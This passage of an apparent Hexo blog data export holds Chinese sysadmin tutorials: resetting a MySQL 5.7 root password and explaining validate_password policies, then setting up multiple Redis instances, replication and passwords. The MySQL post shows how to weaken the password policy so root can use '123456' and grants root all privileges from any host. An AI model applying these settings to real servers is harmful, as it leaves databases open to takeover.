&#x547D;&#x4EE4;&#x67E5;&#x770B;validate_password_policy&#x503C;&#xFF1A;</p>\n<table>\n<thead>\n<tr>\n<th>Variable_name</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>validate_password_dictionary_file</td>\n<td></td>\n</tr>\n<tr>\n<td>validate_password_length</td>\n<td>8</td>\n</tr>\n<tr>\n<td>validate_password_mixed_case_count</td>\n<td>1</td>\n</tr>\n<tr>\n<td>validate_password_number_count</td>\n<td>1</td>\n</tr>\n<tr>\n<td>validate_password_policy</td>\n<td>MEDIUM</td>\n</tr>\n<tr>\n<td>validate_password_special_char_count</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<p><strong>validate_password_policy&#x6709;&#x4EE5;&#x4E0B;&#x53D6;&#x503C;&#xFF1A;</strong></p>\n<table>\n<thead>\n<tr>\n<th>Policy</th>\n<th>Tests Performed</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0 or LOW</td>\n<td>Length</td>\n</tr>\n<tr>\n<td>1 or MEDIUM</td>\n<td>Length; numeric, lowercase/uppercase, and special characters</td>\n</tr>\n<tr>\n<td>2 or STRONG</td>\n<td>Length; numeric, lowercase/uppercase, and special characters; dictionary file</td>\n</tr>\n</tbody>\n</table>\n<p><strong>&#x9ED8;&#x8BA4;&#x662F;1&#xFF0C;&#x5373;MEDIUM&#xFF0C;&#x6240;&#x4EE5;&#x521A;&#x5F00;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x5BC6;&#x7801;&#x5FC5;&#x987B;&#x7B26;&#x5408;&#x957F;&#x5EA6;&#xFF0C;&#x4E14;&#x5FC5;&#x987B;&#x542B;&#x6709;&#x6570;&#x5B57;&#xFF0C;&#x5C0F;&#x5199;&#x6216;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#xFF0C;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002;<br>&#x6240;&#x4EE5;&#x7528;alter user&#x8BED;&#x53E5;&#x91CD;&#x8BBE;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x8BBE;&#x7F6E;&#x6210;&#x529F;&#x3002;</strong></p>\n<blockquote>\n<p>&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#xFF0C;&#x53EA;&#x60F3;&#x8BBE;&#x7F6E;root&#x7684;&#x5BC6;&#x7801;&#x4E3A;123456&#xFF0C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;<br>set global validate_password_policy=0;<br>set global validate_password_length=1;<br>select @@validate_password_length;<br>&#x65B9;&#x6CD5;&#x8BE6;&#x89C1;<a href=\"http://www.cnblogs.com/ivictor/p/5142809.html\" target=\"_blank\" rel=\"external\">http://www.cnblogs.com/ivictor/p/5142809.html</a></p>\n</blockquote>\n<p>&#x6700;&#x540E;&#x6388;&#x6743;root&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x6743;&#x9650;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; Grant all privileges on *.* to <span class=\"string\">&apos;root&apos;</span>@<span class=\"string\">&apos;%&apos;</span> identified by <span class=\"string\">&apos;newpassword&apos;</span> with grant option;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Mysql &#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x8F93;&#x5165; mysql &#x2013;version &#x663E;&#x793A;&#x7248;&#x672C;&#x5982;&#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql  Ver 14.14 Distrib 5.7.13-6, <span class=\"keyword\">for</span> Linux (x86_64) using  6.0</span><br></pre></td></tr></table></figure></p>\n<p>&#x7528;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysqladmin -uroot -p password <span class=\"string\">&apos;newpassword&apos;</span></span><br><span class=\"line\">Enter password:</span><br><span class=\"line\">mysqladmin: connect to server at <span class=\"string\">&apos;localhost&apos;</span> failed</span><br><span class=\"line\">error: <span class=\"string\">&apos;Access denied for user &apos;</span>root<span class=\"string\">&apos;@&apos;</span>localhost<span class=\"string\">&apos; (using password: YES)&apos;</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/mysql stop</span><br><span class=\"line\">mysqld_safe --user=mysql --skip-grant-tables --skip-networking &amp;</span><br><span class=\"line\">mysql -u root mysql</span><br><span class=\"line\">mysql&gt; use mysql</span><br><span class=\"line\">mysql&gt; UPDATE user SET authentication_string=PASSWORD(<span class=\"string\">&apos;newpassword&apos;</span>) <span class=\"built_in\">where</span> USER=<span class=\"string\">&apos;root&apos;</span>;</span><br><span class=\"line\">mysql&gt; FLUSH PRIVILEGES;</span><br><span class=\"line\">mysql&gt; quit</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/init.d/mysql restart</span><br><span class=\"line\">mysql -uroot -p</span><br><span class=\"line\">Enter password: &lt;&#x8F93;&#x5165;&#x65B0;&#x8BBE;&#x7684;&#x5BC6;&#x7801;newpassword&gt;</span><br></pre></td></tr></table></figure></p>","more":"<blockquote>\n<p>&#x6CE8;&#x610F;&#xFF1A;mysql5.7&#x7248;&#x672C;mysql&#x6570;&#x636E;&#x5E93;user&#x8868;&#x7684;&#x5BC6;&#x7801;&#x5B57;&#x6BB5;&#x4E3A;authentication_string, &#x5176;&#x4ED6;&#x7248;&#x672C;&#x5927;&#x90E8;&#x5206;&#x4E3A;password&#xFF0C;update&#x8BED;&#x53E5;&#x76F8;&#x5E94;&#x4E3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE user SET Password=PASSWORD(<span class=\"string\">&apos;newpassword&apos;</span>) <span class=\"built_in\">where</span> USER=<span class=\"string\">&apos;root&apos;</span>;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<hr>\n<p><br></p>\n<p>&#x7528;&#x91CD;&#x7F6E;&#x7684;&#x5BC6;&#x7801;&#x7EC8;&#x4E8E;&#x767B;&#x5F55;&#x6210;&#x529F;&#xFF0C;&#x7ED3;&#x679C;&#x53D1;&#x73B0;&#x64CD;&#x4F5C;&#x4EFB;&#x4F55;sql&#x8BED;&#x53E5;&#x90FD;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You must reset your password using ALTER USER statement before executing this statement.</span><br></pre></td></tr></table></figure></p>\n<p><strong> &#x9519;&#x8BEF;&#x663E;&#x793A;&#x5728;&#x64CD;&#x4F5C;sql&#x8BED;&#x53E5;&#x524D;&#x5FC5;&#x987B;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#xFF0C;&#x7136;&#x540E;&#x8BD5;&#x4E86;&#x597D;&#x51E0;&#x4E2A;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x7684;&#x8BED;&#x53E5;&#x90FD;&#x91CD;&#x7F6E;&#x5931;&#x8D25;&#xFF0C;&#x9677;&#x5165;&#x4E86;&#x6B7B;&#x5FAA;&#x73AF;&#x3002;<br>&#x8FD9;&#x65F6;&#x53D1;&#x73B0;&#x9519;&#x8BEF;&#x63D0;&#x793A;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x9700;&#x4F7F;&#x7528; <font style=\"color:red\">Alter USER </font>&#x8BED;&#x53E5;&#xFF0C;&#x624D;&#x627E;&#x5230;&#x4E86;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x662F;&#x53C8;&#x62A5;&#x5BC6;&#x7801;&#x8FC7;&#x4E8E;&#x7B80;&#x5355;&#x7684;&#x9519;&#x8BEF;&#x3002;</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; alter user <span class=\"string\">&apos;root&apos;</span>@<span class=\"string\">&apos;localhost&apos;</span> identified by <span class=\"string\">&apos;123&apos;</span>; </span><br><span class=\"line\">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</span><br></pre></td></tr></table></figure>\n<p>&#x8FD9;&#x4E2A;&#x9519;&#x8BEF;&#x5176;&#x5B9E;&#x4E0E;validate_password_policy&#x6709;&#x5173;&#xFF0C;mysql5.6&#x7248;&#x672C;&#x540E;&#xFF0C;&#x63A8;&#x51FA;&#x4E86;validate_password&#x63D2;&#x4EF6;&#xFF0C;&#x52A0;&#x5F3A;&#x4E86;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x3002;<br>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; mysql&gt; show variables like &#x201C;%vali%&#x201D; &#x547D;&#x4EE4;&#x67E5;&#x770B;validate_password_policy&#x503C;&#xFF1A;</p>\n<table>\n<thead>\n<tr>\n<th>Variable_name</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>validate_password_dictionary_file</td>\n<td></td>\n</tr>\n<tr>\n<td>validate_password_length</td>\n<td>8</td>\n</tr>\n<tr>\n<td>validate_password_mixed_case_count</td>\n<td>1</td>\n</tr>\n<tr>\n<td>validate_password_number_count</td>\n<td>1</td>\n</tr>\n<tr>\n<td>validate_password_policy</td>\n<td>MEDIUM</td>\n</tr>\n<tr>\n<td>validate_password_special_char_count</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<p><strong>validate_password_policy&#x6709;&#x4EE5;&#x4E0B;&#x53D6;&#x503C;&#xFF1A;</strong></p>\n<table>\n<thead>\n<tr>\n<th>Policy</th>\n<th>Tests Performed</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0 or LOW</td>\n<td>Length</td>\n</tr>\n<tr>\n<td>1 or MEDIUM</td>\n<td>Length; numeric, lowercase/uppercase, and special characters</td>\n</tr>\n<tr>\n<td>2 or STRONG</td>\n<td>Length; numeric, lowercase/uppercase, and special characters; dictionary file</td>\n</tr>\n</tbody>\n</table>\n<p><strong>&#x9ED8;&#x8BA4;&#x662F;1&#xFF0C;&#x5373;MEDIUM&#xFF0C;&#x6240;&#x4EE5;&#x521A;&#x5F00;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x5BC6;&#x7801;&#x5FC5;&#x987B;&#x7B26;&#x5408;&#x957F;&#x5EA6;&#xFF0C;&#x4E14;&#x5FC5;&#x987B;&#x542B;&#x6709;&#x6570;&#x5B57;&#xFF0C;&#x5C0F;&#x5199;&#x6216;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#xFF0C;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002;<br>&#x6240;&#x4EE5;&#x7528;alter user&#x8BED;&#x53E5;&#x91CD;&#x8BBE;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x53D1;&#x73B0;&#x8BBE;&#x7F6E;&#x6210;&#x529F;&#x3002;</strong></p>\n<blockquote>\n<p>&#x5982;&#x679C;&#x4E0D;&#x60F3;&#x5BC6;&#x7801;&#x8BBE;&#x7F6E;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#xFF0C;&#x53EA;&#x60F3;&#x8BBE;&#x7F6E;root&#x7684;&#x5BC6;&#x7801;&#x4E3A;123456&#xFF0C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;<br>set global validate_password_policy=0;<br>set global validate_password_length=1;<br>select @@validate_password_length;<br>&#x65B9;&#x6CD5;&#x8BE6;&#x89C1;<a href=\"http://www.cnblogs.com/ivictor/p/5142809.html\">http://www.cnblogs.com/ivictor/p/5142809.html</a></p>\n</blockquote>\n<p>&#x6700;&#x540E;&#x6388;&#x6743;root&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#x6743;&#x9650;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; Grant all privileges on *.* to <span class=\"string\">&apos;root&apos;</span>@<span class=\"string\">&apos;%&apos;</span> identified by <span class=\"string\">&apos;newpassword&apos;</span> with grant option;</span><br></pre></td></tr></table></figure></p>"},{"title":"Redis多实例及主从搭建","date":"2016-09-18T14:41:19.000Z","toc":false,"_content":"\n> 前提是服务器上已经安装好了redis,\nredis安装可搜索本站另一篇博客：redis安装。\n\n### redis单主机多实例\n\n一、我们首先拷贝两份文件：\n\n```bash\ncp /etc/redis.conf /etc/redis6381.conf\ncp /etc/redis.conf /etc/redis6382.conf\n```\n\n二、修改redis6381配置文件\n```bash\n# vim /etc/redis6381.conf\n\n# 默认情况下 redis 不是作为守护进程运行的，如果你想让它在后台运行，你就把它改成 yes。\ndaemonize yes\n\n# 当redis作为守护进程运行的时候，它会把 pid 默认写到 /var/run/redis.pid 文件里面，\n# 但是你可以在这里自己制定它的文件位置。\npidfile /var/run/redis/redis_6381.pid\n\n# 监听端口号，默认为 6379，如果你设为 0 ，redis 将不在 socket 上监听任何客户端连接。\nport 6381\n\n# 指定日志文件的位置，不同的实例设置不同的日志文件，便于问题定位\nlogfile /var/log/redis/redis_6381.log\n\n# 设置dump的文件名称，不同的实例设置不同的db文件，便于问题定位\ndbfilename dump_6381.rdb\n \n# 工作目录\n# 例如上面的 dbfilename 只指定了文件名，但是它会写入到这个目录下。\n# 这个配置项一定是个目录，而不能是文件名。\n# 这个配置项默认值为“./”，最好改相对路径为绝对路径\n# 如果为相对路径，redis在哪里启动，dump.rdb文件就会产生在启动的目录，这也就是有些人重启redis后key值消失的原因\ndir /data/redisdb/\n\n```\n\n<!-- more -->\n\n相关命令\n```bash\n#启动6381端口服务\nsrc/redis-server /etc/redis6381.conf\n\n#按端口进入客户端\n/usr/bin/redis-cli -p 6381\n```\n\n三、同理我们配置6382配置文件, 成功启动服务后，查看进程：\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/3.png)\n\n\n--- \n\n### redis配置主从\n\n修改6381、6382从库配置：\n```bash\nvim /etc/redis/redis6381.conf\nvim /etc/redis/redis6382.conf\n```\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/4.png)\n\n重启6379、6381、6382服务，可以看到主从数据实现同步\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/5.png)\n\n用客户端登录相关主从服务器，输入info查看主从配置信息\n```bash\n#主机\n127.0.0.1:6379>info\n\n# Replication\nrole:master\nconnected_slaves:1\nslave0:ip=从机ip,port=6379,state=online,offset=140933,lag=1\nmaster_repl_offset:140933\nrepl_backlog_active:1\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:2\nrepl_backlog_histlen:140932\n\n#从机\n127.0.0.1:6381>info\n\n# Replication\nrole:slave\nmaster_host:主机ip\nmaster_port:6379\nmaster_link_status:up\nmaster_last_io_seconds_ago:7\nmaster_sync_in_progress:0\nslave_repl_offset:141073\nslave_priority:100\nslave_read_only:1\nconnected_slaves:0\nmaster_repl_offset:0\nrepl_backlog_active:0\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:0\nrepl_backlog_histlen:0\n\n```\n\n--- \n\n### redis添加密码\n正式环境redis的使用，密码的配置必不可少。\nredis密码缺失的情况下，攻击者很容易通过肉机扫描redis默认端口，免密登录redis进而通过config命令修改服务器配置文件，造成破坏。\n\n修改6379主库配置：\n```bash\nvim /etc/redis/redis6379.conf\n\n# 修改requirepass项\nrequirepass master-password\n```\n修改6381、6382从库配置：\n```bash\nvim /etc/redis/redis6381.conf\nvim /etc/redis/redis6382.conf\n\n# 修改requirepass项\nrequirepass slave-password\n\n# 修改masterauth项\nmasterauth <master-password>\n```\n\n重启服务，按端口按密码进入客户端测试相关效果即可\n```bash\n/usr/bin/redis-cli -p 6382 -a password\n```\n","source":"_posts/Redis多实例及主从搭建.md","raw":"---\ntitle: Redis多实例及主从搭建\ncategories:\n  - 运维部署\ntags:\n  - redis\ndate: 2016-9-18 22:41:19\ntoc: false\n---\n\n> 前提是服务器上已经安装好了redis,\nredis安装可搜索本站另一篇博客：redis安装。\n\n### redis单主机多实例\n\n一、我们首先拷贝两份文件：\n\n```bash\ncp /etc/redis.conf /etc/redis6381.conf\ncp /etc/redis.conf /etc/redis6382.conf\n```\n\n二、修改redis6381配置文件\n```bash\n# vim /etc/redis6381.conf\n\n# 默认情况下 redis 不是作为守护进程运行的，如果你想让它在后台运行，你就把它改成 yes。\ndaemonize yes\n\n# 当redis作为守护进程运行的时候，它会把 pid 默认写到 /var/run/redis.pid 文件里面，\n# 但是你可以在这里自己制定它的文件位置。\npidfile /var/run/redis/redis_6381.pid\n\n# 监听端口号，默认为 6379，如果你设为 0 ，redis 将不在 socket 上监听任何客户端连接。\nport 6381\n\n# 指定日志文件的位置，不同的实例设置不同的日志文件，便于问题定位\nlogfile /var/log/redis/redis_6381.log\n\n# 设置dump的文件名称，不同的实例设置不同的db文件，便于问题定位\ndbfilename dump_6381.rdb\n \n# 工作目录\n# 例如上面的 dbfilename 只指定了文件名，但是它会写入到这个目录下。\n# 这个配置项一定是个目录，而不能是文件名。\n# 这个配置项默认值为“./”，最好改相对路径为绝对路径\n# 如果为相对路径，redis在哪里启动，dump.rdb文件就会产生在启动的目录，这也就是有些人重启redis后key值消失的原因\ndir /data/redisdb/\n\n```\n\n<!-- more -->\n\n相关命令\n```bash\n#启动6381端口服务\nsrc/redis-server /etc/redis6381.conf\n\n#按端口进入客户端\n/usr/bin/redis-cli -p 6381\n```\n\n三、同理我们配置6382配置文件, 成功启动服务后，查看进程：\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/3.png)\n\n\n--- \n\n### redis配置主从\n\n修改6381、6382从库配置：\n```bash\nvim /etc/redis/redis6381.conf\nvim /etc/redis/redis6382.conf\n```\n\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/4.png)\n\n重启6379、6381、6382服务，可以看到主从数据实现同步\n\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/5.png)\n\n用客户端登录相关主从服务器，输入info查看主从配置信息\n```bash\n#主机\n127.0.0.1:6379>info\n\n# Replication\nrole:master\nconnected_slaves:1\nslave0:ip=从机ip,port=6379,state=online,offset=140933,lag=1\nmaster_repl_offset:140933\nrepl_backlog_active:1\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:2\nrepl_backlog_histlen:140932\n\n#从机\n127.0.0.1:6381>info\n\n# Replication\nrole:slave\nmaster_host:主机ip\nmaster_port:6379\nmaster_link_status:up\nmaster_last_io_seconds_ago:7\nmaster_sync_in_progress:0\nslave_repl_offset:141073\nslave_priority:100\nslave_read_only:1\nconnected_slaves:0\nmaster_repl_offset:0\nrepl_backlog_active:0\nrepl_backlog_size:1048576\nrepl_backlog_first_byte_offset:0\nrepl_backlog_histlen:0\n\n```\n\n--- \n\n### redis添加密码\n正式环境redis的使用，密码的配置必不可少。\nredis密码缺失的情况下，攻击者很容易通过肉机扫描redis默认端口，免密登录redis进而通过config命令修改服务器配置文件，造成破坏。\n\n修改6379主库配置：\n```bash\nvim /etc/redis/redis6379.conf\n\n# 修改requirepass项\nrequirepass master-password\n```\n修改6381、6382从库配置：\n```bash\nvim /etc/redis/redis6381.conf\nvim /etc/redis/redis6382.conf\n\n# 修改requirepass项\nrequirepass slave-password\n\n# 修改masterauth项\nmasterauth <master-password>\n```\n\n重启服务，按端口按密码进入客户端测试相关效果即可\n```bash\n/usr/bin/redis-cli -p 6382 -a password\n```\n","slug":"Redis多实例及主从搭建","published":1,"updated":"2016-11-20T03:12:07.325Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulc10025gwtmcjqghqt6","content":"<blockquote>\n<p>&#x524D;&#x63D0;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x597D;&#x4E86;redis,<br>redis&#x5B89;&#x88C5;&#x53EF;&#x641C;&#x7D22;&#x672C;&#x7AD9;&#x53E6;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF1A;redis&#x5B89;&#x88C5;&#x3002;</p>\n</blockquote>\n<h3 id=\"redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;\"><a href=\"#redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;\" class=\"headerlink\" title=\"redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;\"></a>redis&#x5355;&#x4E3B;&#x673A;&#x591A;&#x5B9E;&#x4F8B;</h3><p>&#x4E00;&#x3001;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x62F7;&#x8D1D;&#x4E24;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/redis.conf /etc/redis6381.conf</span><br><span class=\"line\">cp /etc/redis.conf /etc/redis6382.conf</span><br></pre></td></tr></table></figure>\n<p>&#x4E8C;&#x3001;&#x4FEE;&#x6539;redis6381&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/redis6381.conf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; redis &#x4E0D;&#x662F;&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x60F3;&#x8BA9;&#x5B83;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF0C;&#x4F60;&#x5C31;&#x628A;&#x5B83;&#x6539;&#x6210; yes&#x3002;</span></span><br><span class=\"line\">daemonize yes</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x5F53;redis&#x4F5C;&#x4E3A;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5B83;&#x4F1A;&#x628A; pid &#x9ED8;&#x8BA4;&#x5199;&#x5230; /var/run/redis.pid &#x6587;&#x4EF6;&#x91CC;&#x9762;&#xFF0C;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F46;&#x662F;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x81EA;&#x5DF1;&#x5236;&#x5B9A;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;&#x3002;</span></span><br><span class=\"line\">pidfile /var/run/redis/redis_6381.pid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A; 6379&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8BBE;&#x4E3A; 0 &#xFF0C;redis &#x5C06;&#x4E0D;&#x5728; socket &#x4E0A;&#x76D1;&#x542C;&#x4EFB;&#x4F55;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x3002;</span></span><br><span class=\"line\">port 6381</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\">logfile /var/<span class=\"built_in\">log</span>/redis/redis_6381.log</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x8BBE;&#x7F6E;dump&#x7684;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x4F8B;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;db&#x6587;&#x4EF6;&#xFF0C;&#x4FBF;&#x4E8E;&#x95EE;&#x9898;&#x5B9A;&#x4F4D;</span></span><br><span class=\"line\">dbfilename dump_6381.rdb</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x4F8B;&#x5982;&#x4E0A;&#x9762;&#x7684; dbfilename &#x53EA;&#x6307;&#x5B9A;&#x4E86;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x4F1A;&#x5199;&#x5165;&#x5230;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x4E00;&#x5B9A;&#x662F;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x662F;&#x6587;&#x4EF6;&#x540D;&#x3002;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x9879;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;&#x201C;./&#x201D;&#xFF0C;&#x6700;&#x597D;&#x6539;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#x4E3A;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</span></span><br><span class=\"line\"><span class=\"comment\"># &#x5982;&#x679C;&#x4E3A;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;redis&#x5728;&#x54EA;&#x91CC;&#x542F;&#x52A8;&#xFF0C;dump.rdb&#x6587;&#x4EF6;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5728;&#x542F;&#x52A8;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x4E5F;&#x5C31;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x91CD;&#x542F;redis&#x540E;key&#x503C;&#x6D88;&#x5931;&#x7684;&#x539F;&#x56E0;</span></span><br><span class=\"line\">dir /data/redisdb/</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>&#x76F8;&#x5173;&#x547D;&#x4EE4;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 